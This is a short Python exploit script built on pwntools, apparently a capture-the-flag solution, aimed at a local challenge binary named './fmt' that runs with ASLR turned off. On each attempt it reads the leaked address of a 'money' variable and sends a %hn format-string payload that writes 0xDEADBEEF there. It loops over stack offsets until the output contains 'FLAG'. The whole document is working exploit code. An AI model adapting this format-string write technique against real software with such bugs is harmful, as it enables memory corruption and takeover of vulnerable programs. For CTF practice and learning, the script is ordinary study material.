from pwn import *

# Stack-spray: spray both target addresses into the input buffer.
# Format length 31 (31 % 8 == 7) -> sprayed addresses 8-byte aligned
# in overflow slots 12 and 13. Single payload writes 0xDEADBEEF.
for i in range(1,40) : 
    p = process(['setarch', 'x86_64', '-R', './fmt'])

    # Địa chỉ &money đọc từ output của chính chương trình — khỏi hardcode
    p.recvuntil(b'money @ ')
    money_addr = int(p.recvuntil(b' ', drop=True).decode(), 16)
    print(f'&money = {hex(money_addr)}')


    payload = (f'XXXXXX%48873c%{i}$hn%8126c%{i+1}$hn'.encode()
            + b'\x00'
            + p64(money_addr) + p64(money_addr + 2))

    p.sendline(payload)
    out = p.recvall(timeout=5).decode(errors='replace')
    print(i)
    for l in out.split(chr(10)):
        if 'FLAG' in l:
            print(payload)
            print(l[:60])
            exit(0)
